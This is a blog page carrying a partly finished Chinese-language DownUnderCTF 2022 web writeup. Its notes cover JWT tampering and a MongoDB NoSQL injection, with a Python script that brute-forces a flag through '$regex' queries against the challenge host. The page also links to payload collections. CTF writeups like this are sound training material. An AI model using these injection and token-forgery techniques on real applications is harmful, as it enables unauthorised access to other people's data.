@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="玩玩">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DownUnderCTF 2022 writeup">
+<meta property="og:url" content="http://example.com/2022/09/24/DownUnderCTF/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="玩玩">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220924092133072.png">
+<meta property="og:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220924092208082.png">
+<meta property="og:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220925183724020.png">
+<meta property="og:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220924113244660.png">
+<meta property="og:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220924154358201.png">
+<meta property="og:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220924161851727.png">
+<meta property="og:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220925182116181.png">
+<meta property="og:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220925181933001.png">
+<meta property="article:published_time" content="2022-09-24T01:12:10.000Z">
+<meta property="article:modified_time" content="2022-09-25T10:51:29.293Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/24/DownUnderCTF/image-20220924092133072.png">
+
+
+<link rel="canonical" href="http://example.com/2022/09/24/DownUnderCTF/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/09/24/DownUnderCTF/","path":"2022/09/24/DownUnderCTF/","title":"DownUnderCTF 2022 writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>DownUnderCTF 2022 writeup | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">110</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">80</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">148</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Treasure-Hunt-easy"><span class="nav-number">1.1.</span> <span class="nav-text">Treasure Hunt(easy)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge"><span class="nav-number">1.1.1.</span> <span class="nav-text">challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sol"><span class="nav-number">1.1.2.</span> <span class="nav-text">sol</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#noteworthy"><span class="nav-number">1.2.</span> <span class="nav-text">noteworthy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sol-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">sol</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Uni-of-Straya"><span class="nav-number">1.3.</span> <span class="nav-text">Uni of Straya</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dyslexxec"><span class="nav-number">1.4.</span> <span class="nav-text">dyslexxec</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">challenge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sol-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">sol</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#no-symlink"><span class="nav-number">1.5.</span> <span class="nav-text">no-symlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sol-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">sol</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqli2022"><span class="nav-number">1.6.</span> <span class="nav-text">sqli2022</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">148</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">80</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">110</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/24/DownUnderCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="DownUnderCTF 2022 writeup | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DownUnderCTF 2022 writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-09-24 09:12:10" itemprop="dateCreated datePublished" datetime="2022-09-24T09:12:10+08:00">2022-09-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-25 18:51:29" itemprop="dateModified" datetime="2022-09-25T18:51:29+08:00">2022-09-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>玩玩</p>
+<span id="more"></span>
+
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Treasure-Hunt-easy"><a href="#Treasure-Hunt-easy" class="headerlink" title="Treasure Hunt(easy)"></a>Treasure Hunt(easy)</h2><h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Well <span class="keyword">the</span> world has been looking <span class="keyword">for</span> this treasure <span class="keyword">for</span> <span class="keyword">the</span> <span class="keyword">last</span> <span class="number">25</span> years. Maybe you will have <span class="keyword">a</span> better chance <span class="keyword">at</span> finding <span class="keyword">it</span>?</span><br><span class="line">Author: Crem<span class="comment">#2193</span></span><br><span class="line"><span class="keyword">https</span>://web-treasure-hunt-e9a4730c2093<span class="number">.2022</span>.ductf.dev</span><br></pre></td></tr></table></figure>
+
+<h3 id="sol"><a href="#sol" class="headerlink" title="sol"></a>sol</h3><p><img src="/2022/09/24/DownUnderCTF/image-20220924092133072.png" alt="image-20220924092133072"></p>
+<p><img src="/2022/09/24/DownUnderCTF/image-20220924092208082.png" alt="image-20220924092208082"></p>
+<p>感觉像是SSTI</p>
+<p>测试一下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Werkzeug</span>/<span class="number">2</span>.<span class="number">2</span>.<span class="number">2</span> Python/<span class="number">3</span>.<span class="number">8</span>.<span class="number">14</span></span><br></pre></td></tr></table></figure>
+
+<p>之前注册的账号是 8686</p>
+<p>改个jwt就行了</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="attribute">access_token_cookie</span>=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY2NDEwMjA3NSwianRpIjoiZTI2M2U5ZTAtZWEwMy00NDQ2LWIwZjMtZTQwMzFkYmRiNjQwIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6OCwibmJmIjoxNjY0MTAyMDc1LCJleHAiOjE2NjQxMDI5NzV9.vn5YDAS2aR5NxemxCU5u609DczHUNl8Nxgr0eunkl3A</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/09/24/DownUnderCTF/image-20220925183724020.png" alt="image-20220925183724020"></p>
+<p>想着把 sub 改成 1？</p>
+<h2 id="noteworthy"><a href="#noteworthy" class="headerlink" title="noteworthy"></a>noteworthy</h2><h3 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge"></a>challenge</h3><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">What<span class="comment">&#x27;s a beginner-friendly CTF without a totally not generic Bootstrap note taking web chall?</span></span><br><span class="line">Author: joseph<span class="meta">#8210</span></span><br><span class="line">https://web-noteworthy-<span class="number">873</span>b7c844f49.<span class="number">2022</span>.ductf.dev</span><br></pre></td></tr></table></figure>
+
+<h3 id="sol-1"><a href="#sol-1" class="headerlink" title="sol"></a>sol</h3><p>开了一个web 一个mongo</p>
+<p><del>flag在web容器的env里</del>  flag在note里</p>
+<p>就俩文件需要看 看起来像是mongo的注入题</p>
+<p><img src="/2022/09/24/DownUnderCTF/image-20220924113244660.png" alt="image-20220924113244660"></p>
+<p>注册一个</p>
+<p>b1ue0cean:123456</p>
+<p>ok 可以重点看看create note的逻辑上有没有啥毛病  （好像没啥毛病</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/create&#x27;</span>, ensureAuthed, <span class="keyword">async</span> (req, res, <span class="built_in">next</span>) =&gt; &#123;</span><br><span class="line">    const user = <span class="keyword">await</span> User.findById(req.user.userId) <span class="comment">#这里咱应该没法动</span></span><br><span class="line"></span><br><span class="line">    let &#123; contents &#125; = req.body</span><br><span class="line">    <span class="keyword">if</span>(!contents || contents.length &gt; <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">next</span>(&#123; message: <span class="string">&#x27;Invalid contents&#x27;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    contents = contents.toString()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        const noteId = Math.floor(Math.random() * <span class="number">10</span>**<span class="number">12</span>)</span><br><span class="line">        const note = new Note(&#123; owner: user._<span class="built_in">id</span>, noteId, contents &#125;)</span><br><span class="line">        <span class="keyword">await</span> note.save()</span><br><span class="line"></span><br><span class="line">        user.notes.push(note._<span class="built_in">id</span>)</span><br><span class="line">        <span class="keyword">await</span> user.save()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">            success: true,</span><br><span class="line">            message: <span class="string">&#x27;Note created.&#x27;</span> </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; catch &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">next</span>(&#123; message: <span class="string">&#x27;An error occurred&#x27;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看看edit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/edit&#x27;</span>, ensureAuthed, <span class="keyword">async</span> (req, res, <span class="built_in">next</span>) =&gt; &#123;</span><br><span class="line">    let q = req.query</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;noteId&#x27;</span> <span class="keyword">in</span> q &amp;&amp; parseInt(q.noteId) != NaN) &#123;</span><br><span class="line">            const note = <span class="keyword">await</span> Note.findOne(q)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!note) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">next</span>(&#123; message: <span class="string">&#x27;Note does not exist!&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(note.owner.toString() != req.user.userId.toString()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">next</span>(&#123; message: <span class="string">&#x27;You are not the owner of this note!&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            let &#123; contents &#125; = req.body</span><br><span class="line">            <span class="keyword">if</span>(!contents || contents.length &gt; <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">next</span>(&#123; message: <span class="string">&#x27;Invalid contents&#x27;</span> &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">            contents = contents.toString()</span><br><span class="line">            note.contents = contents</span><br><span class="line">            <span class="keyword">await</span> note.save()</span><br><span class="line">            <span class="keyword">return</span> res.json(&#123; success: true, message: <span class="string">&#x27;Note edited.&#x27;</span> &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">next</span>(&#123; message: <span class="string">&#x27;Invalid request&#x27;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch(e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">next</span>(&#123; message: <span class="string">&#x27;Invalid request&#x27;</span> &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>findOne 那里是不是可以时间盲注？ 这个 parseInt 好像只要有 int 就不会返回 NaN</p>
+<p>要以数字开头，，，</p>
+<p>没啥大问题 来注入</p>
+<p>okk 来学习一波 mongodb 的注入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;noteId&#x27;</span> <span class="keyword">in</span> q &amp;&amp; <span class="built_in">parseInt</span>(q.<span class="property">noteId</span>) != <span class="title class_">NaN</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> note = <span class="keyword">await</span> <span class="title class_">Note</span>.<span class="title function_">findOne</span>(q)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>[PayloadsAllTheThings/NoSQL Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL</a> Injection#mongodb-payloads)</p>
+<p>[Mongodb注入攻击 - SecPulse.COM | 安全脉](<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/3278.html">https://www.secpulse.com/archives/3278.html</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://web-noteworthy-873b7c844f49.2022.ductf.dev&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;/edit?noteId=1337&amp;contents[$regex]=^DUCTF&#123;&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;b1ue0cean&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">cookie = &#123;<span class="string">&#x27;jwt&#x27;</span>:<span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MzJlN2FlMDdiMDNiNjJhM2VhNzYzNDMiLCJpYXQiOjE2NjQwMTUwMDgsImV4cCI6MTY2NDYxOTgwOH0.hvWgvy0HhxtLCrmUimK0A2pZ1JHlK3NLkVpmggQudYQ&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url+payload,cookies=cookie)</span><br><span class="line"><span class="comment"># You are not the owner of this note!</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;abdcefghijklmnopqrstuvwxyz012345678ABCDEFGHIJKLMNOPQRSTUVWXYZ_&#x27;</span>:</span><br><span class="line">        res = requests.get(url+payload+i,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are not the owner of this note!&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            payload += i</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Uni-of-Straya"><a href="#Uni-of-Straya" class="headerlink" title="Uni of Straya"></a>Uni of Straya</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">The University <span class="keyword">of</span> Straya are about <span class="built_in">to</span> release their <span class="built_in">new</span> Assignment Submission System (ASS) <span class="keyword">in</span> <span class="literal">two</span> days, but have some concerns about <span class="keyword">the</span> security <span class="keyword">of</span> <span class="keyword">the</span> <span class="built_in">platform</span>. These concerns stemmed <span class="keyword">by</span> <span class="keyword">the</span> lead web developer admitting <span class="built_in">to</span> inhaling burnt Hungry Jacks toys <span class="keyword">while</span> developing <span class="keyword">the</span> Flask REST API.</span><br><span class="line"></span><br><span class="line">To assure <span class="keyword">the</span> security <span class="keyword">of</span> <span class="keyword">the</span> <span class="built_in">platform</span> follows best standards, you have <span class="keyword">the</span> following goals <span class="built_in">to</span> achieve:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>Bypass authorization <span class="keyword">and</span> view <span class="keyword">the</span> admin console located <span class="keyword">at</span> /admin.</span><br><span class="line"><span class="number">2.</span>Bypass access controls that prevent students <span class="built_in">from</span> viewing other assignment submissions <span class="keyword">or</span> <span class="keyword">the</span> source code <span class="keyword">for</span> <span class="keyword">the</span> API. To demonstrate you have achieved this goal, there is <span class="keyword">a</span> <span class="built_in">file</span> called flag.txt <span class="keyword">in</span> <span class="keyword">the</span> API source code <span class="built_in">folder</span>.</span><br><span class="line"><span class="number">3.</span>Exploit <span class="keyword">any</span> critical vulnerabilities, such <span class="keyword">as</span> RCE. If you can achieve RCE, run <span class="keyword">the</span> <span class="keyword">command</span> <span class="title">getfinalflag</span> <span class="title">to</span> <span class="title">get</span> <span class="title">the</span> <span class="title">flag</span>.</span><br></pre></td></tr></table></figure>
+
+<p>这题有意思 先来进入 /admin</p>
+<p>访问 /admin 就自动跳转了，，， </p>
+<p><a href="mailto:&#x74;&#x65;&#115;&#116;&#64;&#x74;&#x65;&#x73;&#116;&#46;&#x63;&#111;&#109;">&#x74;&#x65;&#115;&#116;&#64;&#x74;&#x65;&#x73;&#116;&#46;&#x63;&#111;&#109;</a> 123456</p>
+<p>应该是搞JWT了，，，</p>
+<h2 id="dyslexxec"><a href="#dyslexxec" class="headerlink" title="dyslexxec"></a>dyslexxec</h2><h3 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge"></a>challenge</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Testing </span>out the openpyxl library for python but there&#x27;s some functionality I wish it had.</span><br><span class="line">Author: JZT</span><br><span class="line">https://web-dyslexxec<span class="string">-773</span>a3cb4c483.2022.ductf.dev</span><br><span class="line"> dyslexxec.tar.gz</span><br></pre></td></tr></table></figure>
+
+<h3 id="sol-2"><a href="#sol-2" class="headerlink" title="sol"></a>sol</h3><p>flag在  /etc/passwd 里</p>
+<p>想办法读文件，，，只有这一个要仔细看</p>
